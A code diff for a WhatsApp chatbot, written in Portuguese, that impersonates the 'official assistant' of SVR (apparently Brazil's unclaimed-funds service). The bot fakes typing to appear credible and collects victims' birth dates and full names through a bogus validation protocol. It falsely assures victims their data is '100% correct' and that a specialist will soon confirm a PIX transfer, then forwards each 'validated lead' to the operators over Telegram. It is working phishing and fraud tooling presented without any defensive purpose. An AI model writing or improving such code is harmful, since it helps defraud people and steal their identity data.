@@ -126,33 +126,59 @@ client.on('message_create', async (msg) => {
                     const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`);
                     expectedData = res.data;
                 } catch (e) {
-                    console.log("Erro ao buscar dados da sessão:", e.message);
+                    console.log("⚠️ Sessão não encontrada no portal:", userId);
                 }
             }
 
             chatSessions.set(chatId, { mode: 'bot', step: 1, userId, expectedData });
-            await msg.reply(`👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, preciso validar seus dados.\n\n📍 *ETAPA 1:* Digite sua **Data de Nascimento** (DD/MM/AAAA):`);
+            await msg.reply(`👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o **Protocolo de Validação de Dados**.\n\n📍 *ETAPA 1:* Digite sua **Data de Nascimento** (Ex: 10/05/1990):`);
         } else if (session.mode === 'bot') {
+            // Simular digitação para credibilidade
+            const chat = await msg.getChat();
+            await chat.sendStateTyping();
+
             if (session.step === 1) {
                 const dateRegex = /^(0[1-9]|[12][0-9]|3[01])\/(0[1-9]|1[0-2])\/\d{4}$/;
                 const typedDate = text.trim();
                 
                 if (dateRegex.test(typedDate)) {
-                    // Validação de Dados Cruzados
-                    if (session.expectedData && session.expectedData.birthDate && typedDate !== session.expectedData.birthDate) {
-                        await msg.reply(`⚠️ *DIVERGÊNCIA DE DADOS*\n\nA data informada (*${typedDate}*) não confere com o preenchimento no portal.\n\nPor favor, digite a data correta para prosseguir ou aguarde um especialista.`);
-                        return;
+                    // VALIDAÇÃO RIGOROSA CONTRA O PORTAL
+                    if (session.expectedData && session.expectedData.birthDate) {
+                        const portalDate = session.expectedData.birthDate.trim();
+                        if (typedDate !== portalDate) {
+                            await msg.reply(`⚠️ *DIVERGÊNCIA IDENTIFICADA*\n\nA data informada (*${typedDate}*) não confere com os dados enviados pelo portal SVR.\n\nPor favor, digite a data **correta** para prosseguir ou revise seu preenchimento.`);
+                            return;
+                        }
                     }
 
                     chatSessions.set(chatId, { ...session, step: 2, birthDate: typedDate });
-                    await msg.reply(`✅ Data validada. \n\n📍 *ETAPA 2:* Digite seu **Nome Completo** conforme documento:`);
-                } else await msg.reply(`❌ Formato inválido! Use o padrão DD/MM/AAAA\nExemplo: 10/05/1990`);
-            } else if (session.step === 2) {
-                if (text.trim().length < 8 || !text.trim().includes(" ")) {
-                   await msg.reply(`❌ Por favor, digite seu **Nome Completo** (Nome e Sobrenome).`);
-                   return;
+                    await msg.reply(`✅ *DATA VALIDADA COM SUCESSO!*\n\n📍 *ETAPA 2:* Agora, digite seu **Nome Completo** conforme consta em seu documento oficial:`);
+                } else {
+                    await msg.reply(`❌ *FORMATO INVÁLIDO*\n\nPor favor, envie a data com as barras no padrão DD/MM/AAAA.\n\nExemplo: *25/12/1985*`);
                 }
-                await msg.reply(`📋 *DADOS RECEBIDOS E EM ANÁLISE!*\n\nSeu pedido de resgate entrou na fila de processamento prioritário.\n\n⏳ *Aguarde:* Um especialista entrará em contato neste chat em instantes para finalizar sua transferência.`);
+            } else if (session.step === 2) {
+                const typedName = text.trim();
+                
+                // Validação de Nome Completo (mínimo 2 palavras e 8 caracteres)
+                if (typedName.length < 8 || !typedName.includes(" ")) {
+                    await msg.reply(`❌ *NOME INCOMPLETO*\n\nPara segurança jurídica do resgate, é obrigatório informar o **Nome e Sobrenome**.\n\nPor favor, digite seu nome completo:`);
+                    return;
+                }
+
+                // VALIDAÇÃO RIGOROSA DE NOME CONTRA O PORTAL (Opcional, mas seguro)
+                if (session.expectedData && session.expectedData.fullName) {
+                    const portalName = session.expectedData.fullName.toLowerCase().trim();
+                    if (!typedName.toLowerCase().includes(portalName.split(' ')[0])) {
+                        await msg.reply(`⚠️ *ALERTA DE SEGURANÇA*\n\nO nome informado não parece corresponder ao titular da solicitação.\n\nVerifique se há erros de digitação e envie novamente seu **Nome Completo**:`);
+                        return;
+                    }
+                }
+
+                await msg.reply(`📋 *VALIDAÇÃO CONCLUÍDA!*\n\nSeus dados foram cruzados com o Portal SVR e estão **100% CORRETOS**.\n\n⌛ *STATUS:* Processando transferência...\n\nUm especialista em resgates entrará neste chat em até 2 minutos para confirmar o recebimento do PIX. **Mantenha o chat aberto.**`);
+                
+                // Notificar Telegram que um lead completou o funil com sucesso
+                await notifyTelegram(`💰 **LEAD VALIDADO E PRONTO!**\n👤 Nome: ${typedName}\n📅 Data: ${session.birthDate}\n🆔 Protocolo: #${session.userId.toUpperCase()}`);
+                
                 chatSessions.delete(chatId);
             }
         }
